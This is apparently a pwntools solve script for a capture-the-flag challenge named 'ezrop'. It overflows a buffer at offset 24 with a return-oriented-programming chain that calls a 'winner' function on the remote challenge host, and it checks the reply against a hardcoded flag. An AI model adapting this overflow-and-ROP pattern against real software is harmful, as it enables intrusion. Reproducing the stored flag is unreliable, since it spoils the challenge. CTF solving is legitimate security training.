from pwn import *
import shutup; shutup.please()


flag1 = 'KSUCTF{597f3c2d382591520b83a91c834c370d}'

# 0x0000:         0x401016 ret
# 0x0008:         0x401252 pop rdi; ret
# 0x0010:         0x402004 [arg0] rdi = 4202500
# 0x0018:         0x4011c7 winner

def exploit_1(host: str) -> bool:
    info('Starting exploit 1')
    context.log_level = 'error'
    elf = context.binary = ELF('./ezrop', False)
    # io = elf.process()                       # For local use
    io = remote(host, 443, ssl=True, sni=host) # For remote use 
    rop = ROP(elf)
    rop.raw(0x401016)
    rop.call(0x4011c7, [0x402004])
    io.sendlineafter(b': ', flat({24: rop.chain()}))
    flag = io.recvline(False).decode()
    context.log_level = 'debug'
    info('Finished exploit 1')
    return flag == flag1


print(exploit_1('ksuctf-ezrop.chals.io'))
